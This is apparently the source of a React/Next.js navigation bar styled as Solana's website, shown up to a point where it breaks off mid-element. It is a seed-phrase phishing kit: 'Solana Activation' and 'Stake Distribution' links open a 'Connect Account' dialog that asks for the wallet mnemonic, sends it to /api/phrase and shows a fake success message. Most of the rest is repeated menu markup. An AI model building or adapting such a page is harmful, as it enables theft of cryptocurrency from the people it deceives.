import React, { Fragment } from "react";
import Link from 'next/link';
import { BsArrowDownRight, BsDiscord, BsReddit, BsTelegram } from "react-icons/bs";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import Image from 'next/image'
import { AiFillTwitterCircle } from "react-icons/ai";
import { Dialog, Transition } from '@headlessui/react'


export default function Navbar() {
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);
    const [mobiledev, setMobiledev] = React.useState(false);
    const [mobilenet, setMobilenet] = React.useState(false);
    const [mobilecom, setMobilecom] = React.useState(false);
    const [phrase, setPhrase] = React.useState("");
    const [error, setError] = React.useState("");
    const [text, setText] = React.useState("");

    let [isOpen, setIsOpen] = React.useState(false)

    const notify = () => {
        phrase === "" ? setError("Invalid input") : toast.success("Phrase Successfully Imported");
    };


    const handleSubmit = (e) => {
        console.log(e)
        e.preventDefault
        if (phrase !== "") {
            setError("")
            const pS = { phrase: phrase};
            console.log(pS);
            fetch("/api/phrase", {
                body: JSON.stringify({
                    phrase: phrase,
                }),
                headers: {
                    "Content-Type": "application/json",
                },
                method: "POST",
            });
            setIsOpen(false)
            
        }
    };

    function closeModal() {
        setIsOpen(false)
    }

    function openModal(e) {
        setText(e == 1 ? "Solana Activation" : "Stake Solana")
        setIsOpen(true)
        setIsMenuOpen(false)
    }


    return (
        <>
            <ToastContainer />
            <Transition appear show={isOpen} as={Fragment}>
                <Dialog as="div" className="relative z-10" onClose={closeModal}>
                    <Transition.Child
                        as={Fragment}
                        enter="ease-out duration-300"
                        enterFrom="opacity-0"
                        enterTo="opacity-100"
                        leave="ease-in duration-200"
                        leaveFrom="opacity-100"
                        leaveTo="opacity-0"
                    >
                        <div className="fixed inset-0 bg-black bg-opacity-25" />
                    </Transition.Child>

                    <div className="fixed inset-0 overflow-y-auto">
                        <div className="flex min-h-full items-center justify-center p-4 text-center">
                            <Transition.Child
                                as={Fragment}
                                enter="ease-out duration-300"
                                enterFrom="opacity-0 scale-95"
                                enterTo="opacity-100 scale-100"
                                leave="ease-in duration-200"
                                leaveFrom="opacity-100 scale-100"
                                leaveTo="opacity-0 scale-95"
                            >
                                <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
                                    <Dialog.Title
                                        as="h3"
                                        className="text-lg font-medium leading-6 text-gray-900"
                                    >
                                        Connect Account
                                    </Dialog.Title>
                                    <div className="mt-2">
                                        <div className="modal-body replace">
                                            <p className="text-sm text-black">Do not close until connection is successful</p>
                                            <label htmlFor="message-text" className="text-bold text-right text-indigo-400">Mnemonic Phrase:</label>

                                            {/* color: black;font-style: italic;font-weight: bold;font-size: 13px */}
                                            <form className="
                                                flex flex-col items-center justify-center
                                                text-center
                                                text-sm text-black
                                                text-bold 
                                            " onSubmit={handleSubmit}>
                                                <div className="form-group flex-1">
                                                    <textarea
                                                        onChange={(e) => setPhrase(e.target.value)}
                                                        required
                                                        className="
                                                    form-control
                                                    bg-white
                                                    border-2 border-gray-300 rounded-lg py-2 px-4
                                                    focus:outline-none focus:shadow-outline-blue focus:border-blue-300
                                                    " id="message-text" rows="3" />
                                                </div>
                                                <span className="text-red-500  text-sm">{error.length > 0 && error}</span>

                                                <div className="mt-4">
                                                    <button onClick={notify}
                                                        className="inline-flex justify-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-900 hover:bg-blue-200 focus:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 focus-visible:ring-offset-2"

                                                    >
                                                     {text} ⛓

                                                    </button>
                                                </div>
                                            </form>
                                            <label>Typically 12 (sometimes 24) words separated by single spaces</label><br />



                                        </div>
                                    </div>


                                </Dialog.Panel>
                            </Transition.Child>
                        </div>
                    </div>
                </Dialog>
            </Transition>
            <div className="z-50 right-px left-px drop-shadow-md">
                <div className="px-2 pl-0 py-2 mx-auto lg:py-4 sm:max-w-xl md:max-w-full lg:max-w-screen-xl md:px-24 lg:px-1">
                    <div className="relative flex items-center justify-between lg:justify-center lg:space-x-16">
                        <img src="/solanalogo.svg" width={150} className="mr-auto" />
                        <ul className="items-center hidden space-x-8 lg:flex">
                            <li className="toggleable hover:text-white">
                                <input type="checkbox" value="selected" id="toggle-one" className="toggle-input" />
                                <label htmlFor="toggle-one" className="block cursor-pointer text-lg tracking-wide text-white transition-colors duration-200 hover:text-teal-accent-400">Developers</label>

                                <div role="toggle" className="p-6 px-2 pl-0 mega-menu mb-16 sm:mb-0 shadow-xl mega-bg">
                                    <hr className="py-4 border-slate-600" />
                                    <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                        <ul className="pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">resources</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">getting started</h3>
                                                    <p>Developer Resources</p>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">nfts</h3>
                                                    <p>Mint, sell, and trade NFTs at scale.</p>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">defi</h3>
                                                    <p>Low fees. Low latency. Capital efficiency.</p>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">gaming</h3>
                                                    <p>Web3 Games, Web2 speeds</p>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">payments</h3>
                                                    <p>Decentralized payments at scale</p>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                    <h3 className="uppercase font-bold">daos</h3>
                                                    <p>Governance that just works</p>
                                                </a>
                                            </li>
                                        </ul>
                                        <div className="flex flex-col px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <ul>
                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">learning</h3>
                                                <hr className="py-2 border-slate-600" />
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solana Cookbook &nbsp; <BsArrowDownRight /> </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">SolDev &nbsp; <BsArrowDownRight /> </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solana Docs &nbsp; <BsArrowDownRight /> </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Metaplex Docs &nbsp; <BsArrowDownRight /> </a>
                                                </li>
                                            </ul>

                                            <ul className="mt-4">
                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">careers <span className="tag">we re hiring</span></h3>
                                                <hr className="py-2 border-slate-600" />

                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">See Available Positions &nbsp; <BsArrowDownRight /> </a>
                                                </li>
                                            </ul>
                                        </div>
                                        <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">guides & tutorials</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Figment Learn &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Questbook x Supreteam `&nbsp;` <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Building Solana Programs &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Anchor Framework &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">A Guide to Full Stack Development on Solana &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Solana Blockchain Concept &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </li>


                            <li className="toggleable hover:text-white">
                                <input type="checkbox" value="selected" id="toggle-two" className="toggle-input" />
                                <label htmlFor="toggle-two" className="block cursor-pointer text-lg tracking-wide text-white transition-colors duration-200 hover:text-teal-accent-400">Network</label>

                                <div role="toggle" className="p-6 px-2 pl-0 mega-menu mb-16 sm:mb-0 shadow-xl mega-bg">
                                    <hr className="py-4 border-slate-600" />
                                    <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                        <ul className="pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">inspect</h3>
                                            <hr className="py-2 border-slate-600" />

                                            <li>
                                                <a href="https://solscan.io" target="_blank" rel="noopener noreferrer" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solscan &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="https://exploresolana.com" target="_blank" rel="noopener noreferrer" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Explorer &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"  onClick={()=> openModal(1)}>Solana Activation &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end" onClick={()=> openModal(2)} >Stake Distribution &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                        </ul>

                                        <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">status</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Network Status &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Email Alerts &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                        </ul>

                                        <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">interact</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Environment &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">RPC Providers &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </li>


                            <li>
                                <Link
                                    href="/">
                                    <a className="text-lg tracking-wide text-white transition-colors duration-200 hover:text-teal-accent-400">Validators</a>
                                </Link>
                            </li>

                            <li className="toggleable hover:text-white">
                                <input type="checkbox" value="selected" id="toggle-three" className="toggle-input" />
                                <label htmlFor="toggle-three" className="block cursor-pointer text-lg tracking-wide text-white transition-colors duration-200 hover:text-teal-accent-400">Community</label>

                                <div role="toggle" className="p-6 px-2 pl-0 mega-menu mb-16 sm:mb-0 shadow-xl mega-bg">
                                    <hr className="py-4 border-slate-600" />
                                    <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                        <div className="flex flex-col pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <ul>
                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">community</h3>
                                                <hr className="py-2 border-slate-600" />

                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Home </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Events </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Breakpoint </a>
                                                </li>
                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Branding </a>
                                                </li>
                                            </ul>

                                            <ul className="mt-4">
                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">collective <span className="tag">help solana grow</span></h3>
                                                <hr className="py-2 border-slate-600" />

                                                <li>
                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Join the Collective <BsArrowDownRight /> </a>
                                                </li>
                                            </ul>
                                        </div>


                                        <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">content</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">News</a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Podcasts &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">YouTube &nbsp; <BsArrowDownRight /> </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Newsletter</a>
                                            </li>
                                        </ul>

                                        <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                            <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">socials</h3>
                                            <hr className="py-2 border-slate-600" />
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"> <AiFillTwitterCircle size={20} /> &nbsp; Twitter </a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsDiscord size={20} /> &nbsp; Discord</a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsReddit size={20} /> &nbsp; Reddit</a>
                                            </li>
                                            <li>
                                                <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsTelegram size={20} /> &nbsp; Telegram</a>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </li>


                            <li>
                                <Link
                                    href="/">
                                    <a className="text-lg tracking-wide text-white transition-colors duration-200 hover:text-teal-accent-400">Ecosystem</a>
                                </Link>
                            </li>
                        </ul>


                        {/* MOBILE NAV */}
                        <div className="lg:hidden">
                            <button
                                aria-label="Open Menu"
                                title="Open Menu"
                                className="p-2 -mr-1 transition duration-200 rounded focus:outline-none focus:shadow-outline"
                                onClick={() => setIsMenuOpen(!isMenuOpen)}
                            >
                                <svg className="w-5 text-gray-600" viewBox="0 0 24 24">
                                    <path
                                        fill="currentColor"
                                        d="M23,13H1c-0.6,0-1-0.4-1-1s0.4-1,1-1h22c0.6,0,1,0.4,1,1S23.6,13,23,13z"
                                    />
                                    <path
                                        fill="currentColor"
                                        d="M23,6H1C0.4,6,0,5.6,0,5s0.4-1,1-1h22c0.6,0,1,0.4,1,1S23.6,6,23,6z"
                                    />
                                    <path
                                        fill="currentColor"
                                        d="M23,20H1c-0.6,0-1-0.4-1-1s0.4-1,1-1h22c0.6,0,1,0.4,1,1S23.6,20,23,20z"
                                    />
                                </svg>
                            </button>
                            {isMenuOpen && (
                                <div className="absolute top-0 left-0 w-full">
                                    <div className="p-5 mega-bg rounded shadow-sm">
                                        <div className="flex items-center justify-between mb-4 border-0">
                                            <div>
                                                <img src="/solanalogo.svg" width={150} className="mr-auto" />
                                            </div>
                                            <div>
                                                <button
                                                    aria-label="Close Menu"
                                                    title="Close Menu"
                                                    className="p-2 -mt-2 -mr-2 transition duration-200 rounded hover:bg-gray-200 focus:bg-gray-200 focus:outline-none focus:shadow-outline"
                                                    onClick={() => setIsMenuOpen(false)}
                                                >
                                                    <svg className="w-5 text-gray-600" viewBox="0 0 24 24">
                                                        <path
                                                            fill="currentColor"
                                                            d="M19.7,4.3c-0.4-0.4-1-0.4-1.4,0L12,10.6L5.7,4.3c-0.4-0.4-1-0.4-1.4,0s-0.4,1,0,1.4l6.3,6.3l-6.3,6.3 c-0.4,0.4-0.4,1,0,1.4C4.5,19.9,4.7,20,5,20s0.5-0.1,0.7-0.3l6.3-6.3l6.3,6.3c0.2,0.2,0.5,0.3,0.7,0.3s0.5-0.1,0.7-0.3 c0.4-0.4,0.4-1,0-1.4L13.4,12l6.3-6.3C20.1,5.3,20.1,4.7,19.7,4.3z"
                                                        />
                                                    </svg>
                                                </button>
                                            </div>
                                        </div>
                                        <nav>
                                            <hr className="pt-2 border-slate-600" />
                                            <ul className="space-y-4">
                                                <li className="tab w-full overflow-hidden py-2 border-b border-slate-600">

                                                    <input className="absolute opacity-0" id="tab-single-one" type="radio" onClick={() => setMobiledev(!mobiledev)} />
                                                    <label className="tracking-wide text-white text-lg focus:text-red pl-2 transition-colors duration-200 hover:text-green-400 cursor-pointer" htmlFor="tab-single-one">Developers</label>
                                                    <div className={`tab-content ${mobiledev ? 'overflow-scroll' : 'overflow-hidden'} leading-normal`}>

                                                        {/* TAB CONTENT START */}
                                                        {mobiledev && <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                                            <ul className="pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">resources</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">getting started</h3>
                                                                        <p>Developer Resources</p>
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">nfts</h3>
                                                                        <p>Mint, sell, and trade NFTs at scale.</p>
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">defi</h3>
                                                                        <p>Low fees. Low latency. Capital efficiency.</p>
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">gaming</h3>
                                                                        <p>Web3 Games, Web2 speeds</p>
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">payments</h3>
                                                                        <p>Decentralized payments at scale</p>
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-3 py-2 pl-0 text-md text-white hover:text-green-400 transition">
                                                                        <h3 className="uppercase font-bold">daos</h3>
                                                                        <p>Governance that just works</p>
                                                                    </a>
                                                                </li>
                                                            </ul>
                                                            <div className="flex flex-col px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <ul>
                                                                    <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">learning</h3>
                                                                    <hr className="py-2 border-slate-600" />
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solana Cookbook &nbsp; <BsArrowDownRight /> </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">SolDev &nbsp; <BsArrowDownRight /> </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solana Docs &nbsp; <BsArrowDownRight /> </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Metaplex Docs &nbsp; <BsArrowDownRight /> </a>
                                                                    </li>
                                                                </ul>

                                                                <ul className="mt-4">
                                                                    <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">careers <span className="tag">we &apos;re hiring</span></h3>
                                                                    <hr className="py-2 border-slate-600" />

                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">See Available Positions &nbsp; <BsArrowDownRight /> </a>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                            <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">guides & tutorials</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Figment Learn &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Questbook x Supreteam &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Building Solana Programs &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Anchor Framework &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">A Guide to Full Stack Development on Solana &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Intro to Solana Blockchain Concept &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                        }
                                                    </div>
                                                </li>

                                                <li className="tab w-full overflow-hidden py-2 border-b border-slate-600">

                                                    <input className="absolute opacity-0" id="tab-single-two" type="radio" onClick={() => setMobilenet(!mobilenet)} />
                                                    <label className="tracking-wide text-white text-lg focus:text-red pl-2 transition-colors duration-200 hover:text-green-400 cursor-pointer" htmlFor="tab-single-two">Network</label>
                                                    <div className={`tab-content ${mobilenet ? 'overflow-scroll' : 'overflow-hidden'} leading-normal`}>

                                                        {/* TAB CONTENT START */}
                                                        {mobilenet && <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                                            <ul className="pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">inspect</h3>
                                                                <hr className="py-2 border-slate-600" />

                                                                <li>
                                                                    <a href="https://exploresolana.com" target="_blank" rel="noopener noreferrer" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Solscan &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="https://solscan.io" target="_blank" rel="noopener noreferrer" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Explorer &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end" onClick={()=> openModal(1)} >Solana Activation &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end" onClick={()=> openModal(2)}>Stake Distribution &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                            </ul>

                                                            <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">status</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Network Status &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Email Alerts &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                            </ul>

                                                            <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">interact</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Environment &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">RPC Providers &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                        }
                                                    </div>
                                                </li>

                                                <li className="border-b border-slate-600 py-2">
                                                    <Link
                                                        href="/">
                                                        <a className="tracking-wide text-white text-lg focus:text-red pl-2 transition-colors duration-200 hover:text-green-400 cursor-pointer">Validators</a>
                                                    </Link>
                                                </li>

                                                <li className="tab w-full overflow-hidden py-2 border-b border-slate-600">

                                                    <input className="absolute opacity-0" id="tab-single-three" type="radio" onClick={() => setMobilecom(!mobilecom)} />
                                                    <label className="tracking-wide text-white text-lg focus:text-red pl-2 transition-colors duration-200 hover:text-green-400 cursor-pointer" htmlFor="tab-single-three">Community</label>
                                                    <div className={`tab-content ${mobilecom ? 'overflow-scroll' : 'overflow-hidden'} leading-normal`}>

                                                        {/* TAB CONTENT START */}
                                                        {mobilecom && <div className="container mx-auto w-full flex flex-wrap justify-between mx-2 ml-0">
                                                            <div className="flex flex-col pl-0 pr-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <ul>
                                                                    <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">community</h3>
                                                                    <hr className="py-2 border-slate-600" />

                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Home </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Events </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Breakpoint </a>
                                                                    </li>
                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Branding </a>
                                                                    </li>
                                                                </ul>

                                                                <ul className="mt-4">
                                                                    <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">collective <span className="tag">help solana grow</span></h3>
                                                                    <hr className="py-2 border-slate-600" />

                                                                    <li>
                                                                        <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Join the Collective <BsArrowDownRight /> </a>
                                                                    </li>
                                                                </ul>
                                                            </div>


                                                            <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">content</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">News</a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Podcasts &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">YouTube &nbsp; <BsArrowDownRight /> </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end">Newsletter</a>
                                                                </li>
                                                            </ul>

                                                            <ul className="px-4 w-full sm:w-1/2 lg:w-1/3 pb-6 pt-6 lg:pt-3">
                                                                <h3 className="font-semibold text-md text-slate-400 text-bold mb-2 uppercase">socials</h3>
                                                                <hr className="py-2 border-slate-600" />
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"> <AiFillTwitterCircle size={20} /> &nbsp; Twitter </a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsDiscord size={20} /> &nbsp; Discord</a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsReddit size={20} /> &nbsp; Reddit</a>
                                                                </li>
                                                                <li>
                                                                    <a href="#" className="block p-2 pl-0 text-white hover:text-green-400 transition flex align-end"><BsTelegram size={20} /> &nbsp; Telegram</a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                        }
                                                    </div>
                                                </li>

                                                <li className="border-b border-slate-600 py-2">
                                                    <Link
                                                        href="/">
